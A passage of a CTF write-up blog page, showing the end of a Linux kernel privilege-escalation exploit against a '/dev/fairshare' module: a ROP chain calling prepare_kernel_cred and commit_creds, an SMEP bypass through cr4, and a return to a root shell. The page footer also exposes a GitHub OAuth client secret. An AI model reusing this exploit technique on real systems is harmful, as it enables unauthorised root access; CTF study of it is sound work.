<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> * mmap_ptr64_0 = (<span class="keyword">uint64_t</span> *)mmap_start;</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; mmap_size / <span class="number">8</span>; i = i + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        mmap_ptr64_0[i] = mmap_start;</span><br><span class="line">    &#125; </span><br><span class="line">    save_stats();</span><br><span class="line">    <span class="keyword">uint64_t</span> fakeStack = mmap_start;</span><br><span class="line">    <span class="keyword">u_int64_t</span> * mmap_ptr64 = (<span class="keyword">uint64_t</span> *)((<span class="keyword">char</span> *)<span class="number">0x9000</span> + <span class="number">0x210</span>);</span><br><span class="line">    mmap_ptr64[<span class="number">1</span>] =  <span class="number">0xffffffff810420e0</span>;<span class="comment">//xor   -&gt; rdi = 0;</span></span><br><span class="line">    mmap_ptr64[<span class="number">2</span>] =  <span class="number">0xffffffff8107a500</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">    mmap_ptr64[<span class="number">3</span>] =  <span class="number">0xffffffff8188d61a</span>;<span class="comment">// mov rdi,rax;  set rdi for commit_creds</span></span><br><span class="line">    mmap_ptr64[<span class="number">4</span>] =  <span class="number">0x1111111111111111</span>;<span class="comment">// commit_creds </span></span><br><span class="line">    mmap_ptr64[<span class="number">5</span>] =  <span class="number">0xffffffff8107a190</span>;<span class="comment">// commit_creds </span></span><br><span class="line">    mmap_ptr64[<span class="number">6</span>] =  <span class="number">0xffffffff81046fe0</span>;<span class="comment">//swapgs ;ret </span></span><br><span class="line">    mmap_ptr64[<span class="number">7</span>] =  <span class="number">0xffffffff8101fb32</span>;<span class="comment">//iretq objdump -j .text -d vmlinux.bin | grep iretq | head -1</span></span><br><span class="line">    mmap_ptr64[<span class="number">8</span>] = get_shell;</span><br><span class="line">    mmap_ptr64[<span class="number">9</span>] = user_cs;</span><br><span class="line">    mmap_ptr64[<span class="number">10</span>] = user_rflags;</span><br><span class="line">    mmap_ptr64[<span class="number">11</span>] = mmap_start +<span class="number">0x1000</span>;</span><br><span class="line">    mmap_ptr64[<span class="number">12</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    control_flow_hijack_primitive cfhp;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    cfhp.rax = <span class="number">0xaaaaaaaaaaaaaaaa</span>;</span><br><span class="line">    cfhp.rbx = <span class="number">0xbbbbbbbbbbbbbbbb</span>;</span><br><span class="line">    cfhp.rcx = <span class="number">0xcccccccccccccccc</span>;</span><br><span class="line">    cfhp.rdx = <span class="number">0xdddddddddddddddd</span>;</span><br><span class="line">    cfhp.rsi = <span class="number">0xeeeeeeeeeeeeeeee</span>;</span><br><span class="line">    cfhp.rdx = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    cfhp.r8  = <span class="number">0x8888888888888888</span>;</span><br><span class="line">    cfhp.r9  = <span class="number">0x9999999999999999</span>;</span><br><span class="line">    cfhp.r10 = <span class="number">0x1010101010101010</span>;</span><br><span class="line">    cfhp.r11 = <span class="number">0x1111111111111111</span>;</span><br><span class="line">    cfhp.r12 = <span class="number">0x1212121212121212</span>;</span><br><span class="line">    cfhp.r13 = <span class="number">0x1313131313131313</span>;</span><br><span class="line">    cfhp.r14 = <span class="number">0x1414141414141414</span>;</span><br><span class="line">    cfhp.r15 = <span class="number">0x1515151515151515</span>;</span><br><span class="line">    cfhp.rdi = <span class="number">0x00000000000006f0</span>;</span><br><span class="line">    cfhp.rip = <span class="number">0xffffffff810b9bef</span>;<span class="comment">//add rsp 0x40 -&gt; mov cr4 rdi </span></span><br><span class="line">    cfhp.rsp = <span class="number">0xffffffff81046f20</span>; <span class="comment">// mov cr4 rdi  bypass smep</span></span><br><span class="line">    cfhp.rbp = <span class="number">0xffffffff810566a2</span>;</span><br><span class="line">    cfhp.reset_all = <span class="number">0xabababababababab</span>;</span><br><span class="line">                                                                        </span><br><span class="line">                                              </span><br><span class="line">    save_stats();</span><br><span class="line">    set_memory();</span><br><span class="line">    fd = open(<span class="string">"/dev/fairshare"</span>,O_RDWR);</span><br><span class="line">    ioctl(fd,do_sport,&amp;cfhp);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>总结</p>
+<ul>
+<li>最好还是编译一个带符号的内核或者下载内核符号表，不然跟到报错输出才知道早就跳出了正常流程。</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/kernel/" rel="tag"># kernel</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/24/qiangwangbei-core/" rel="next" title="qiangwangbei-core">
+                <i class="fa fa-chevron-left"></i> qiangwangbei-core
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div onclick="showGitment()" id="gitment-display-button">显示 Gitment 评论</div>
+        <div id="gitment-container" style="display:none"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">greyd0g</p>
+              <p class="site-description motion-element" itemprop="description">day day up</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org" title="腹黑's Blog" target="_blank">腹黑's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn" title="江sir's Blog" target="_blank">江sir's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://sec2hack.com/" title="Wfox's Blog" target="_blank">Wfox's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg's Blog" target="_blank">Brucetg's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影's Blog" target="_blank">奈沙夜影's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cyto.top/" title="Cytosineの's Blog" target="_blank">Cytosineの's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花' Blog" target="_blank">小花' Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ's Blog" target="_blank">FraMeQ's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">greyd0g</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+      <style>
+        a.gitment-editor-footer-tip { display: none; }
+        .gitment-container.gitment-footer-container { display: none; }
+      </style>
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'greyd0g# MUST HAVE, Your Github ID',
+            repo: 'greyd0g.github.io# MUST HAVE, The repo you use to store Gitment comments',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '49e64e3c97f36a8034c37a86dfa044a8be29208e# EITHER this or proxy_gateway, Github access secret token for the Gitment',
+            
+                client_id: '1a762312d58b3f30d273# MUST HAVE, Github client id for the Gitment'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      function showGitment(){
+        document.getElementById("gitment-display-button").style.display = "none";
+        document.getElementById("gitment-container").style.display = "block";
+        renderGitment();
+      }
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+</body>
+</html>
